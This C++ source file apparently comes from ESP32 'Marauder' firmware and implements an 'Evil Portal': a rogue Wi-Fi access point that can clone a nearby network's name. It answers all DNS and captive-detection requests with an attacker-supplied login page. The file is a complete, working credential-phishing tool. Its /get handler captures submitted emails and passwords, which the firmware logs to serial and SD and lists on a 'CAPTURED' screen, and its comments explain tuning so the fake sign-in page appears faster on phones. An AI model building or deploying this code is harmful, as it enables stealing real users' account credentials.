#include "EvilPortal.h"
#include <esp_wifi.h>   // esp_wifi_set_band_mode() -- pin the portal AP to 2.4 GHz on the dual-band C5

char apName[MAX_AP_NAME_SIZE] = "PORTAL";

char* index_html = nullptr;

namespace {
bool replacePortalHtml(const char* html, size_t length) {
  if (!html || length >= MAX_HTML_SIZE) return false;

  #ifdef HAS_PSRAM
    char* replacement = static_cast<char*>(ps_malloc(length + 1));
  #else
    char* replacement = static_cast<char*>(malloc(length + 1));
  #endif
  if (!replacement) return false;

  memcpy(replacement, html, length);
  replacement[length] = '\0';
  free(index_html);
  index_html = replacement;
  return true;
}
}

// Native ESP-IDF HTTP server. The ESP32-C5 does not accept connections through
// AsyncTCP/ESPAsyncWebServer (the phone associates but every request is
// refused), which is why the captive portal never served. The working v1.16.0
// V8 firmware uses esp_http_server, so we do too.
static httpd_handle_t evil_portal_httpd = nullptr;

extern EvilPortal evil_portal_obj;

namespace {

// Minimal application/x-www-form-urlencoded value decoder (%XX and '+').
String portalUrlDecode(const char* src) {
  String out;
  if (src == nullptr) return out;
  for (size_t i = 0; src[i] != '\0'; i++) {
    char c = src[i];
    if (c == '+') {
      out += ' ';
    } else if (c == '%' && src[i + 1] && src[i + 2]) {
      auto hex = [](char h) -> int {
        if (h >= '0' && h <= '9') return h - '0';
        if (h >= 'a' && h <= 'f') return h - 'a' + 10;
        if (h >= 'A' && h <= 'F') return h - 'A' + 10;
        return -1;
      };
      int hi = hex(src[i + 1]), lo = hex(src[i + 2]);
      if (hi >= 0 && lo >= 0) {
        out += static_cast<char>((hi << 4) | lo);
        i += 2;
      } else {
        out += c;
      }
    } else {
      out += c;
    }
  }
  return out;
}

esp_err_t portalSendHtml(httpd_req_t* req) {
  httpd_resp_set_type(req, "text/html");
  if (index_html != nullptr)
    return httpd_resp_send(req, index_html, HTTPD_RESP_USE_STRLEN);
  return httpd_resp_send(req, "", 0);
}

// Root + any captive-detection path (served via the 404 fallback) returns the
// portal HTML, which triggers the client's captive-portal detection.
esp_err_t portalRootHandler(httpd_req_t* req) {
  return portalSendHtml(req);
}

esp_err_t portalCatchAll(httpd_req_t* req, httpd_err_code_t error) {
  httpd_resp_set_status(req, "200 OK");
  return portalSendHtml(req);
}

esp_err_t portalApNameHandler(httpd_req_t* req) {
  httpd_resp_set_type(req, "text/plain");
  String ssid = WiFi.softAPSSID();
  return httpd_resp_send(req, ssid.c_str(), HTTPD_RESP_USE_STRLEN);
}

// Captured credentials arrive as /get?email=...&password=...
esp_err_t portalGetHandler(httpd_req_t* req) {
  size_t qlen = httpd_req_get_url_query_len(req) + 1;
  if (qlen > 1) {
    char* query = static_cast<char*>(malloc(qlen));
    if (query != nullptr) {
      if (httpd_req_get_url_query_str(req, query, qlen) == ESP_OK) {
        char value[160];
        if (httpd_query_key_value(query, "email", value, sizeof(value)) == ESP_OK)
          evil_portal_obj.onCredentialField(true, portalUrlDecode(value));
        if (httpd_query_key_value(query, "password", value, sizeof(value)) == ESP_OK)
          evil_portal_obj.onCredentialField(false, portalUrlDecode(value));
      }
      free(query);
    }
  }
  httpd_resp_set_type(req, "text/html");
  const char* redirect =
      "<html><head><script>setTimeout(() => { window.location.href='/' }, 100);"
      "</script></head><body></body></html>";
  return httpd_resp_send(req, redirect, HTTPD_RESP_USE_STRLEN);
}

}  // namespace

void EvilPortal::onCredentialField(bool is_email, const String& value) {
  if (is_email) {
    this->user_name = value;
    this->name_received = true;
  } else {
    this->password = value;
    this->password_received = true;
  }
}

void EvilPortal::setup() {
  this->runServer = false;
  this->name_received = false;
  this->password_received = false;
  this->has_html = false;
  this->has_ap = false;

  html_files = new LinkedList<String>();
  if (captured_creds == nullptr) captured_creds = new LinkedList<String>();

  #ifdef HAS_SD
    if (sd_obj.supported) {
      sd_obj.listDirToLinkedList(html_files, "/", "html");

      #ifndef MARAUDER_V8
        Serial.println("Evil Portal Found " + (String)html_files->size() + " HTML files");
      #endif
    }
  #endif
}

void EvilPortal::cleanup() {
  // Only tear the HTTP server / DNS down if THIS object actually started them.
  // cleanup() is called from every StopScan, not just Evil Portal's, so guard on
  // runServer to avoid touching network state on unrelated scans. httpd_stop()
  // here (while lwIP is still up -- StopScan calls cleanup() before
  // shutdownWiFi()) closes the listening socket so the next activation's
  // httpd_start() binds cleanly. AP/radio teardown is left to shutdownWiFi().
  const bool portal_was_running = this->runServer;
  this->runServer = false;
  this->ap_index = -1;

  if (portal_was_running) {
    // Stop the HTTP server first (while the AP netif / lwIP are still up) so its
    // listening socket closes cleanly, then the DNS server.
    this->dnsServer.stop();
    if (evil_portal_httpd != nullptr) {
      httpd_stop(evil_portal_httpd);
      evil_portal_httpd = nullptr;
    }
    // Tear down the softAP through Arduino, exactly as stock Marauder's Evil
    // Portal does. This releases the AP netif + DHCP pool and cleanly deinits
    // the radio, which is what lets the NEXT scan receive again -- without it
    // the softAP lingered and promiscuous RX stayed dead ("Scan AP shows
    // nothing after an Evil Portal"). Stock pairs this same call with the
    // esp_wifi_init(&cfg) in RunEvilPortal, so the next portal re-creates the AP
    // normally.
    //
    // Restore the default dual-band mode first (startAP() pinned the radio to
    // 2.4 GHz only). Do it while the driver is still up -- before the AP teardown
    // -- so a later 5 GHz scan isn't silently stuck on 2.4 GHz.
    #if defined(SOC_WIFI_SUPPORT_5G) && SOC_WIFI_SUPPORT_5G
      esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
    #endif
    WiFi.softAPdisconnect(true);
  }

  free(index_html);
  index_html = nullptr;
  this->has_html = false;
  this->using_serial_html = false;
}

bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  if (!this->has_ap) {
    if (!this->setAP(ssids, access_points))
      return false;
  }
  if (!this->setHtml())
    return false;
    
  startPortal();

  return true;
}

String EvilPortal::get_user_name() {
  return this->user_name;
}

String EvilPortal::get_password() {
  return this->password;
}

void EvilPortal::setupServer() {
  // Start (or restart) the native HTTP server on a fresh socket each activation.
  if (evil_portal_httpd != nullptr) {
    httpd_stop(evil_portal_httpd);
    evil_portal_httpd = nullptr;
  }

  httpd_config_t config = HTTPD_DEFAULT_CONFIG();
  config.server_port = 80;
  config.ctrl_port = 32768;
  config.lru_purge_enable = true;
  config.max_uri_handlers = 8;
  config.stack_size = 4096;  // default; keep the httpd task's internal heap small
  config.max_open_sockets = 4;

  if (httpd_start(&evil_portal_httpd, &config) != ESP_OK) {
    evil_portal_httpd = nullptr;
    #ifndef MARAUDER_V8
      Serial.println(F("Evil Portal: httpd_start failed"));
    #endif
    return;
  }

  httpd_uri_t root_uri = {};
  root_uri.uri = "/";
  root_uri.method = HTTP_GET;
  root_uri.handler = portalRootHandler;
  httpd_register_uri_handler(evil_portal_httpd, &root_uri);

  httpd_uri_t get_uri = {};
  get_uri.uri = "/get";
  get_uri.method = HTTP_GET;
  get_uri.handler = portalGetHandler;
  httpd_register_uri_handler(evil_portal_httpd, &get_uri);

  httpd_uri_t apname_uri = {};
  apname_uri.uri = "/get-ap-name";
  apname_uri.method = HTTP_GET;
  apname_uri.handler = portalApNameHandler;
  httpd_register_uri_handler(evil_portal_httpd, &apname_uri);

  // Every other path (the OS captive-detection probes: /generate_204,
  // /hotspot-detect.html, /ncsi.txt, ...) is unregistered and so lands on the
  // 404 handler, which answers 200 + the portal HTML. That mismatch is what
  // makes the phone pop the "Sign in" page.
  httpd_register_err_handler(evil_portal_httpd, HTTPD_404_NOT_FOUND, portalCatchAll);
}

void EvilPortal::setHtmlFromSerial() {
  #ifndef MARAUDER_V8
    Serial.println(F("Setting HTML from serial..."));
  #endif
  const String html = Serial.readString();
  if (!replacePortalHtml(html.c_str(), html.length())) {
    Serial.println(F("Unable to allocate HTML buffer"));
    return;
  }
  this->has_html = true;
  this->using_serial_html = true;
  #ifndef MARAUDER_V8
    Serial.println("html set");
  #endif
}

bool EvilPortal::setHtml() {
  if (this->using_serial_html) {
    #ifndef MARAUDER_V8
      Serial.println(F("html previously set"));
    #endif
    return true;
  }
  #ifndef MARAUDER_V8
    Serial.println(F("Setting HTML..."));
  #endif
  #ifdef HAS_SD
    File html_file = sd_obj.getFile("/" + this->target_html_name);
  #else
    File html_file;
  #endif
  if (!html_file) {
    #ifdef HAS_SCREEN
      this->sendToDisplay("Could not find /" + this->target_html_name);
      this->sendToDisplay(F("Touch to exit..."));
    #endif
    #ifndef MARAUDER_V8
      Serial.println("Could not find /" + this->target_html_name + ". Use stopscan...");
    #endif
    return false;
  }
  else {
    if (html_file.size() > MAX_HTML_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("The given HTML is too large. Touch to exit..."));
      #endif
      #ifndef MARAUDER_V8
        Serial.println("The provided HTML is too large.\nUse stopscan...");
      #endif
      return false;
    }
    String html = "";
    while (html_file.available()) {
      char c = html_file.read();
      if (isPrintable(c))
        html.concat(c);
    }
    if (!replacePortalHtml(html.c_str(), html.length())) {
      html_file.close();
      #ifndef MARAUDER_V8
        Serial.println(F("Unable to allocate HTML buffer"));
      #endif
      return false;
    }
    this->has_html = true;
    #ifndef MARAUDER_V8
      Serial.println("html set");
    #endif
    html_file.close();
    return true;
  }

}

bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  // See if there are selected APs first
  int targ_ap_index = -1;
  String ap_config = "";
  String temp_ap_name = "";
  for (int i = 0; i < access_points->size(); i++) {
    if (access_points->get(i).selected) {
      temp_ap_name = access_points->get(i).essid;
      targ_ap_index = i;
      break;
    }
  }
  // If there are no SSIDs and there are no APs selected, pull from file
  // This means the file is last resort
  if ((ssids->size() <= 0) && (temp_ap_name == "")) {
    return this->setAPFromConfig();
  }
  // There are SSIDs in the list but there could also be an AP selected
  // Priority is SSID list before AP selected and config file
  else if (ssids->size() > 0) {
    ap_config = ssids->get(0).essid;
    if (ap_config.length() > MAX_AP_NAME_SIZE) {
      #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
        this->sendToDisplay(F("The given AP name is too large. Touch to exit..."));
      #endif
      #ifndef MARAUDER_V8
        Serial.println("The provided AP name is too large.\nUse stopscan...");
      #endif
      return false;
    }
    #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
      this->sendToDisplay(F("AP name from SSID list"));
      this->sendToDisplay("AP name: " + ap_config);
    #endif
    #ifndef MARAUDER_V8
      Serial.println("AP name from SSID list: " + ap_config);
    #endif
  }
  else if (temp_ap_name != "") {
    if (temp_ap_name.length() > MAX_AP_NAME_SIZE) {
      #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
        this->sendToDisplay(F("The given AP name is too large. Touch to exit..."));
      #endif
      #ifndef MARAUDER_V8
        Serial.println("The given AP name is too large.\nUse stopscan...");
      #endif
    }
    else {
      ap_config = temp_ap_name;
      #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
        this->sendToDisplay(F("AP name from AP list"));
        this->sendToDisplay("AP name: " + ap_config);
      #endif
      #ifndef MARAUDER_V8
        Serial.println("AP name from AP list: " + ap_config);
      #endif
    }
  }
  else {
    #ifndef MARAUDER_V8
      Serial.println(F("Could not configure Access Point. Use stopscan..."));
    #endif
    #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
      this->sendToDisplay(F("Could not configure Access Point.\nTouch to exit..."));
    #endif
  }

  if (ap_config != "") {
    strncpy(apName, ap_config.c_str(), MAX_AP_NAME_SIZE);
    this->has_ap = true;
    #ifndef MARAUDER_V8
      Serial.println(F("ap config set"));
    #endif
    this->ap_index = targ_ap_index;
    return true;
  }
  else
    return false;

}

bool EvilPortal::setAPFromConfig() {
  #ifdef HAS_SD
    File ap_config_file = sd_obj.getFile("/ap.config.txt");
  #else
    File ap_config_file;
  #endif

  if (!ap_config_file || ap_config_file.size() > MAX_AP_NAME_SIZE) {
    if (ap_config_file)
      ap_config_file.close();
    return false;
  }

  String ap_config = ap_config_file.readString();
  ap_config_file.close();

  if (this->setAP(ap_config)) {
    this->ap_index = -1;
    return true;
  }

  return false;
}

bool EvilPortal::setAP(String essid) {
  if (essid == "")
    return false;

  if (essid.length() > MAX_AP_NAME_SIZE) {
    return false;
  }

  strncpy(apName, essid.c_str(), MAX_AP_NAME_SIZE - 1);
  apName[MAX_AP_NAME_SIZE - 1] = '\0';
  this->has_ap = true;
  #ifndef MARAUDER_V8
    Serial.println(F("ap config set"));
  #endif
  return true;
}

void EvilPortal::startAP() {
  // Standard private captive-portal gateway. The old 172.0.0.1 is a PUBLIC
  // address (the RFC1918 172 block is 172.16-172.31 only); phones' captive-
  // portal detection triggers faster and more reliably against a conventional
  // private gateway, so the sign-in page pops right away instead of "eventually".
  const IPAddress AP_IP(192, 168, 4, 1);

  // Bring the softAP up, retrying a few times. After a long/dense AP scan the
  // internal (DMA) heap can be fragmented, or the previous mode's radio teardown
  // may not have fully settled, so the first WiFi.softAP() intermittently fails
  // and the SSID never broadcasts ("sometimes it works, sometimes it doesn't",
  // worse on the Mini V3 with its smaller internal-heap headroom). A short settle
  // + retry brings it up reliably. On the healthy path (e.g. the V8) it comes up
  // on the first attempt and the rest of the loop never runs.
  bool up = false;
  for (int attempt = 0; attempt < 4; attempt++) {
    WiFi.mode(WIFI_AP);
    // A prior Remote ID scan / wardrive / packet sniffer runs the WiFi driver in
    // PROMISCUOUS mode with its own RX callback hooked. If that survives into AP
    // mode, the softAP's inbound association + DHCP frames are delivered to the
    // leftover sniffer callback instead of the AP's network stack -- the SSID
    // beacons fine but a phone associates and then just hangs ("keeps loading").
    // This is why Evil Portal broke specifically after using the drone/Remote ID
    // scan. Force promiscuous off and drop any stale callback before we bring the
    // AP up so the AP owns the whole RX path.
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    // Dual-band ESP32-C5: the radio runs on only ONE band at a time, and the
    // default band mode (AUTO = 2.4G + 5G) lets the softAP come up on a band/
    // channel the phone never scans -- so the SSID "hosts" but never appears in
    // the Wi-Fi list ("says hosting but doesn't pop up"). Pin the portal to
    // 2.4 GHz, the band every phone scans and the one captive-portal detection
    // expects. Must run AFTER WiFi.mode() has started the driver; the band mode
    // can't be set before the driver is up.
    #if defined(SOC_WIFI_SUPPORT_5G) && SOC_WIFI_SUPPORT_5G
      esp_wifi_set_band_mode(WIFI_BAND_MODE_2G_ONLY);
      // Force a legacy 2.4 GHz-compatible PHY on the AP interface. Allowed only
      // when the band is NOT AUTO (which we just pinned to 2G), and it keeps the
      // beacon on classic 11b/g/n that every phone scans.
      esp_wifi_set_protocol(WIFI_IF_AP,
          WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
    #endif
    WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
    // Explicit 2.4 GHz channel 1 -- don't rely on the core's default channel
    // once the band is pinned.
    up = WiFi.softAP(apName, NULL, 1);
    if (up && WiFi.softAPIP() != IPAddress(0, 0, 0, 0))
      break;
    // Failed to come up: drop the half-started AP and let the radio settle.
    WiFi.softAPdisconnect(true);
    delay(200);
  }

  // Diagnostics: what channel/band did the AP actually land on? Printed over the
  // dongle's USB-CDC serial so we can tell a "wrong band" failure (5 GHz channel)
  // from a "wrong SSID / not beaconing" one.
  #ifndef MARAUDER_V8
    {
      uint8_t prim_chan = 0;
      wifi_second_chan_t sec_chan = WIFI_SECOND_CHAN_NONE;
      esp_wifi_get_channel(&prim_chan, &sec_chan);
      int band_mode_val = -1;
      #if defined(SOC_WIFI_SUPPORT_5G) && SOC_WIFI_SUPPORT_5G
        wifi_band_mode_t bm = WIFI_BAND_MODE_AUTO;
        if (esp_wifi_get_band_mode(&bm) == ESP_OK) band_mode_val = (int)bm;
      #endif
      Serial.printf("[EP] ssid='%s' up=%d ip=%s chan=%u band_mode=%d\n",
                    apName, (int)up, WiFi.softAPIP().toString().c_str(),
                    (unsigned)prim_chan, band_mode_val);
    }
  #endif

  #ifndef MARAUDER_V8
    Serial.print(F("ap ip address: "));
    Serial.println(WiFi.softAPIP());
  #endif
  #ifdef HAS_SCREEN
    if (!up || WiFi.softAPIP() == IPAddress(0, 0, 0, 0))
      this->sendToDisplay(F("SoftAP failed to start -- stopscan and retry"));
  #endif

  // Start the native HTTP server fresh on the just-created AP. (Done every
  // activation because cleanup() stops it; esp_http_server binds its own socket
  // so this reliably accepts connections on the ESP32-C5, unlike AsyncTCP.)
  this->setupServer();

  this->dnsServer.start(53, "*", WiFi.softAPIP());
  #ifndef MARAUDER_V8
    Serial.println(F("Evil Portal READY"));
  #endif
  // Status is shown on the live portal HUD (drawPortalStatus); don't queue a
  // sticky console line, it would repaint over the HUD.
}

void EvilPortal::startPortal() {
  // wait for flipper input to get config index
  this->startAP();

  // Reset the live status HUD for this portal session.
  this->num_creds = 0;
  this->last_cred = "";
  if (this->captured_creds != nullptr) this->captured_creds->clear();
  this->portal_start_ms = millis();
  this->portal_ui_ms = 0;
  this->portal_needs_clear = true;

  this->runServer = true;
}

void EvilPortal::sendToDisplay(String msg) {
  #ifdef HAS_SCREEN
    String display_string = "";
    display_string.concat(msg);
    int temp_len = display_string.length();
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }
    display_obj.loading = true;
    // Portal HTML lives in internal heap on no-PSRAM targets and can put the
    // general allocation guard into pressure mode. Keep these bounded status
    // and credential lines visible while still respecting queue backpressure.
    display_obj.queueCriticalLine(display_string);
    display_obj.loading = false;
  #endif
}

void EvilPortal::main(uint8_t scan_mode) {
  if (scan_mode != WIFI_SCAN_EVIL_PORTAL || !this->has_ap || !this->has_html) {
    return;
  }

  // Drain all DNS queries waiting this iteration, not just one. On connect a
  // phone fires a burst of captive-detection lookups; answering them all now
  // (bounded so we never hog the loop) makes the sign-in page appear promptly
  // instead of after the phone's retry timeout.
  for (int i = 0; i < 12; i++)
    this->dnsServer.processNextRequest();

  if (this->name_received && this->password_received) {
    this->name_received = false;
    this->password_received = false;

    // Adjust size depending on your max username/password length
    char line[96];

    // If user_name / password are still Arduino String:
    snprintf(line, sizeof(line),
             "u: %s p: %s\n",
             this->user_name.c_str(),
             this->password.c_str());

    Serial.print(line);
    buffer_obj.append(line);

    // Feed the live status HUD instead of scrolling a console line over it.
    // user_name / password already hold the just-captured values. Append to the
    // on-screen list (newest last) and cap it so memory stays bounded.
    this->num_creds++;
    if (this->captured_creds != nullptr) {
      this->captured_creds->add(this->user_name + " : " + this->password);
      while (this->captured_creds->size() > 40) this->captured_creds->remove(0);
    }
  }

  #ifdef HAS_SCREEN
    if (static_cast<int32_t>(millis() - this->portal_ui_ms) >= 0) {
      this->portal_ui_ms = millis() + 700;
      this->drawPortalStatus();
    }
  #endif
}

#ifdef HAS_SCREEN
// Clean live status screen for the active Evil Portal, matching the attack HUD
// style: amber header, hosted SSID, armed HTML page, connected client count, a
// big captured-credential count, elapsed time, and the last captured identity.
// Display only. Wipes the body once (first frame) then updates fields in place
// with background-filled text, so it is cheap and does not flicker.
void EvilPortal::drawPortalStatus() {
  const uint32_t now = millis();
  const int W = display_obj.tft.width();
  const int H = display_obj.tft.height();
  #ifdef HAS_MINI_SCREEN
    const int pad = 2, barH = 13, lh = 11;
  #else
    const int pad = 5, barH = 18, lh = 16;
  #endif
  const int topY = 16;
  const uint16_t accent = TFT_ORANGE;

  const int bodyTop = topY + barH;
  if (this->portal_needs_clear) {
    display_obj.tft.fillRect(0, bodyTop, W, H - bodyTop, TFT_BLACK);
    this->portal_needs_clear = false;
  }

  // Header bar.
  display_obj.tft.setTextDatum(TL_DATUM);
  display_obj.tft.setTextSize(1);
  display_obj.tft.fillRect(0, topY, W, barH, accent);
  display_obj.tft.setTextColor(TFT_BLACK, accent);
  display_obj.tft.drawString("EVIL PORTAL", pad, topY + (barH - 8) / 2, 1);
  bool blink = ((now / 500) & 1);
  display_obj.tft.setTextColor(blink ? TFT_BLACK : accent, accent);
  display_obj.tft.drawString("AP", W - pad - 12, topY + (barH - 8) / 2, 1);

  int y = bodyTop + pad;
  const int lineChars = (W - 2 * pad) / 6;
  auto line = [&](const String& s, uint16_t color, int yy) {
    String t = s;
    if ((int)t.length() > lineChars) t = t.substring(0, lineChars);
    while ((int)t.length() < lineChars) t += ' ';
    display_obj.tft.setTextColor(color, TFT_BLACK);
    display_obj.tft.drawString(t, pad, yy, 1);
  };

  line(String("SSID: ") + apName, TFT_WHITE, y); y += lh;
  line(String("Page: ") + this->target_html_name, TFT_CYAN, y); y += lh;

  // Clients + elapsed on one line.
  const uint32_t elapsed = (now - this->portal_start_ms) / 1000;
  char et[12];
  snprintf(et, sizeof(et), "%02lu:%02lu",
           (unsigned long)(elapsed / 60), (unsigned long)(elapsed % 60));
  #ifdef HAS_MINI_SCREEN
    line(String("Cli ") + (int)WiFi.softAPgetStationNum(), TFT_WHITE, y);
  #else
    line(String("Clients ") + (int)WiFi.softAPgetStationNum(), TFT_WHITE, y);
  #endif
  display_obj.tft.setTextDatum(TR_DATUM);
  display_obj.tft.setTextColor(TFT_WHITE, TFT_BLACK);
  display_obj.tft.drawString(String(et), W - pad, y, 1);
  display_obj.tft.setTextDatum(TL_DATUM);
  y += lh;

  // Divider + captured-credentials header.
  y += 2;
  display_obj.tft.drawFastHLine(pad, y, W - 2 * pad, TFT_DARKGREY);
  y += pad + 2;
  line(String("CAPTURED: ") + this->num_creds, TFT_GREEN, y); y += lh;

  // Accumulating list of every captured credential ("user : pass"), newest at
  // the top, as many as fit on the screen. The full history is in the SD log;
  // once the list outgrows the screen the oldest scroll off the bottom.
  if (this->captured_creds != nullptr) {
    const int maxY = H - lh;
    for (int i = this->captured_creds->size() - 1; i >= 0 && y <= maxY; i--) {
      bool newest = (i == this->captured_creds->size() - 1);
      line(this->captured_creds->get(i), newest ? TFT_WHITE : TFT_LIGHTGREY, y);
      y += lh;
    }
  }
}
#endif
